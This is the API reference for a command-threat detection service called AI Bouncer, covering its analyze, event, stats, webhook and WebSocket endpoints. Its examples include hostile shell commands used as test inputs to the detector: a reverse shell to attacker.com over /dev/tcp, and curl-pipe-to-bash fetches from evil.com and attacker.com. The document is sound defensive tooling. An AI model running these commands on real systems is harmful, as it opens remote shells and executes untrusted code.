# API Reference

## Overview

The AI Bouncer API is built with FastAPI and provides both synchronous HTTP endpoints and real-time WebSocket streaming for threat analysis.

The normal production flow is agent-driven: the endpoint agent keeps the backend running and forwards events automatically. The `/analyze` endpoint remains useful for manual testing, demos, and standalone analysis.

**Base URL**: `http://localhost:8000`  
**Docs**: `http://localhost:8000/docs` (Swagger UI)  
**ReDoc**: `http://localhost:8000/redoc` (ReDoc UI)

---

## HTTP Endpoints

### Liveness Probe

Fast health check — use this for uptime monitoring and pre-flight checks.

```http
GET /healthz
```

**Response** (200 OK):
```json
{"status": "ok"}
```

---

### Full Health Check

Returns basic API metadata and event count.

```http
GET /
```

**Response** (200 OK):
```json
{
  "status": "online",
  "name": "AI Bouncer + Kernel Guard",
  "version": "0.1.0",
  "events_stored": 42
}
```

---

### Analyze Command

Analyze a single command for threat level.

```http
POST /analyze
Content-Type: application/json

{
  "command": "string"
}
```

**Parameters**:
- `command` (string, required): The command to analyze (non-empty)

**Usage Notes**:
- This endpoint is primarily for manual analysis and test traffic.
- The agent/runtime path already feeds the backend automatically in kernel mode.

**Response** (200 OK):
```json
{
  "command": "curl http://evil.com/script.sh | bash",
  "classification": "malicious",
  "risk_score": 85.2,
  "matched_rules": ["shell_piping"],
  "ml_confidence": 0.92,
  "explanation": "🚨 Command is likely malicious... | Risk Score: 85.2/100 | Detected patterns: shell_piping | ML Model confidence: 92.0%"
}
```

**Response Fields**:
- `command` (string): The command that was analyzed
- `classification` (string): One of `"safe"`, `"suspicious"`, or `"malicious"`
- `risk_score` (number): 0-100 threat level
- `matched_rules` (array): List of triggered detection rules
- `ml_confidence` (number): 0-1 probability from ML model
- `explanation` (string): Human-readable reasoning

**Status Codes**:
- `200 OK` - Analysis successful
- `400 Bad Request` - Command is empty or malformed
- `500 Internal Server Error` - Backend error (check logs)

**Examples**:

Safe command:
```bash
curl -X POST http://localhost:8000/analyze \
  -H "Content-Type: application/json" \
  -d '{"command":"ls -la /tmp"}'
```

Response:
```json
{
  "command": "ls -la /tmp",
  "classification": "safe",
  "risk_score": 5.2,
  "matched_rules": [],
  "ml_confidence": 0.02,
  "explanation": "✅ Command appears safe. | Risk Score: 5.2/100 | No suspicious patterns detected in command. | ML Model confidence: 2.0%"
}
```

Malicious command:
```bash
curl -X POST http://localhost:8000/analyze \
  -H "Content-Type: application/json" \
  -d '{"command":"bash -i >& /dev/tcp/attacker.com/4444 0>&1"}'
```

Response:
```json
{
  "command": "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
  "classification": "malicious",
  "risk_score": 92.5,
  "matched_rules": ["reverse_shell_pattern"],
  "ml_confidence": 0.95,
  "explanation": "🚨 Command is likely malicious and should be blocked. | Risk Score: 92.5/100 | Detected patterns: reverse_shell_pattern | ML Model confidence: 95.0%"
}
```

---

### Ingest Agent Event

Receive an event forwarded by the always-on agent.

```http
POST /agent/events
Content-Type: application/json

{
  "command": "string",
  "pid": 1234,
  "ppid": 1200,
  "uid": 1000,
  "gid": 1000,
  "argv_str": "string",
  "comm": "string",
  "timestamp": 1699500000.123
}
```

**Usage Notes**:
- This is the always-on agent path for forwarded endpoint events.
- The agent/runtime path already feeds the backend automatically in kernel mode.
- The backend runs the same detection pipeline, stores the event, and broadcasts it to the dashboard.

**Response** (200 OK):
Same shape as `/analyze`.

---

### Get Events

Retrieve recent security events.

```http
GET /events?limit=100
```

**Query Parameters**:
- `limit` (integer, optional): Max events to return (default: 100, max: 1000)

**Usage Notes**:
- The dashboard hydrates from this endpoint on load.
- Agent-fed events and API-analyzed events both appear here once persistence is connected.

**Response** (200 OK):
```json
[
  {
    "id": "evt_a1b2c3d4",
    "command": "ls -la",
    "pid": 1234,
    "ppid": 1200,
    "uid": 1000,
    "gid": 1000,
    "risk_score": 5.2,
    "classification": "safe",
    "matched_rules": [],
    "ml_confidence": 0.02,
    "timestamp": 1699500000.123,
    "detected_at": 1699500000.456
  },
  ...
]
```

**Response Fields** (per event):
- `id` (string): Unique event identifier
- `command` (string): The command executed
- `pid` (integer): Process ID
- `ppid` (integer): Parent process ID
- `uid` (integer): User ID
- `gid` (integer): Group ID
- `risk_score` (number): 0-100 threat level
- `classification` (string): `"safe"`, `"suspicious"`, or `"malicious"`
- `matched_rules` (array): Triggered detection rules
- `ml_confidence` (number): 0-1 confidence
- `timestamp` (number): When command executed (Unix timestamp)
- `detected_at` (number): When detection ran (Unix timestamp)

**Status Codes**:
- `200 OK` - Events retrieved
- `500 Internal Server Error` - Backend error

**Example**:
```bash
curl http://localhost:8000/events?limit=10 | jq '.'
```

---

### Get Statistics

Get aggregated threat statistics.

```http
GET /stats
```

**Response** (200 OK):
```json
{
  "total_events": 150,
  "safe": 120,
  "suspicious": 20,
  "malicious": 10
}
```

**Response Fields**:
- `total_events` (integer): Total events processed
- `safe` (integer): Count of safe commands
- `suspicious` (integer): Count of suspicious commands
- `malicious` (integer): Count of malicious commands

**Status Codes**:
- `200 OK` - Stats retrieved
- `500 Internal Server Error` - Backend error

**Example**:
```bash
curl http://localhost:8000/stats | jq '.'
```

---

## Webhooks & Alerts

Manage webhook integrations and view alert history.

### Add Webhook

Register a new webhook URL to receive alerts for malicious events.

```http
POST /webhooks
Content-Type: application/json

{
  "url": "https://webhook.site/...",
  "is_active": true
}
```

**Response** (200 OK):
```json
{
  "id": "wh_a1b2c3d4",
  "url": "https://webhook.site/...",
  "is_active": true,
  "created_at": 1699500000.123
}
```

### List Webhooks

Get all registered webhooks.

```http
GET /webhooks
```

**Response** (200 OK): Array of Webhook objects.

### Delete Webhook

Remove a webhook integration.

```http
DELETE /webhooks/{webhook_id}
```

**Response** (200 OK):
```json
{
  "success": true
}
```

### Get Alert History

Retrieve a log of sent alerts and their delivery status.

```http
GET /alerts/history?limit=50
```

**Response** (200 OK):
```json
[
  {
    "id": "alt_1234",
    "event_id": "evt_abcd",
    "webhook_url": "https://webhook.site/...",
    "status": "success",
    "timestamp": 1699500100.456
  }
]
```

---

## WebSocket

Stream real-time security events to connected clients.

### Connect

```
ws://localhost:8000/ws
```

### Message Format

Events are sent as JSON when:
1. A new WebSocket client connects (receives recent 100 events)
2. A new command is analyzed (broadcasts to all clients)

**Event Message**:
```json
{
  "id": "evt_a1b2c3d4",
  "command": "curl http://attacker.com | bash",
  "pid": 5678,
  "ppid": 5600,
  "uid": 1000,
  "gid": 1000,
  "argv_str": "curl http://attacker.com | bash",
  "comm": "bash",
  "risk_score": 85.2,
  "classification": "malicious",
  "matched_rules": ["shell_piping"],
  "ml_confidence": 0.92,
  "timestamp": 1699500100.123,
  "detected_at": 1699500100.456,
  "explanation": "..."
}
```

### Client-to-Server

The client can send `ping` to keep the connection alive:

```json
"ping"
```

Server responds with:
```json
"pong"
```

### Example (JavaScript)

```javascript
const ws = new WebSocket('ws://localhost:8000/ws');

ws.onopen = () => {
  console.log('Connected');
};

ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  console.log(`Event: ${data.command} - ${data.classification}`);
};

ws.onerror = (error) => {
  console.error('WebSocket error:', error);
};

ws.onclose = () => {
  console.log('Disconnected');
};

// Keep alive (optional)
setInterval(() => {
  if (ws.readyState === WebSocket.OPEN) {
    ws.send('ping');
  }
}, 30000);
```

### Example (Python)

```python
import asyncio
import websockets
import json

async def listen():
    uri = "ws://localhost:8000/ws"
    async with websockets.connect(uri) as websocket:
        print("Connected")
        async for message in websocket:
            try:
                event = json.loads(message)
                print(f"Event: {event['command']} - {event['classification']}")
            except json.JSONDecodeError:
                # Could be "pong" response
                pass

asyncio.run(listen())
```

---

## Error Responses

All errors follow this format:

```json
{
  "detail": "Error message"
}
```

**Common Errors**:

`400 Bad Request`:
```json
{
  "detail": "Command cannot be empty"
}
```

`500 Internal Server Error`:
```json
{
  "detail": "Internal server error"
}
```

---

## Classification Thresholds

| Range | Classification | Action |
|-------|----------------|--------|
| 0-29 | `safe` | Allow execution |
| 30-69 | `suspicious` | Log and allow |
| 70-100 | `malicious` | Block and alert |

Risk score is calculated as:
```
risk_score = 0.6 * rule_score + 0.4 * ml_score
```

Where:
- `rule_score` (0-100): Pattern matching from rule engine
- `ml_score` (0-100): ML model probability × 100

---

## Rate Limiting

Currently: **No rate limiting** (planned in Phase 3)

For production, the plan is to apply:
- `POST /analyze` → 30 req/min per IP
- `POST /agent/events` → 60 req/min per IP
- `GET /events` → 20 req/min per IP

---

## Authentication

Currently: **No authentication required** (open for demo)

Planned for Phase 3: API key header (`X-API-Key`) via env var.

---

## CORS

**Allowed Origins** are controlled by the `FRONTEND_ORIGINS` env variable in `.env`.

Default:
```
FRONTEND_ORIGINS=http://localhost:5173,http://127.0.0.1:5173
```

For a deployed demo, add your URL:
```
FRONTEND_ORIGINS=http://localhost:5173,https://your-app.vercel.app
```

---

## Response Times

**Typical latencies**:
- Health check: <1ms
- Command analysis: 5-10ms (rules + ML)
- Event retrieval: 1-2ms
- WebSocket broadcast: <5ms

---

## Testing with curl

```bash
# Health check
curl http://localhost:8000/

# Analyze safe command
curl -X POST http://localhost:8000/analyze \
  -H "Content-Type: application/json" \
  -d '{"command":"ls -la"}'

# Analyze malicious command
curl -X POST http://localhost:8000/analyze \
  -H "Content-Type: application/json" \
  -d '{"command":"curl http://evil.com/script.sh | bash"}'

# Get events
curl "http://localhost:8000/events?limit=10"

# Get statistics
curl http://localhost:8000/stats

# WebSocket (using websocat or wscat)
wscat -c ws://localhost:8000/ws
```

---

## Version History

| Version | Date | Changes |
|---------|------|---------|
| 0.1.0 | May 2026 | Initial MVP release |

---

**Last Updated**: May 2026
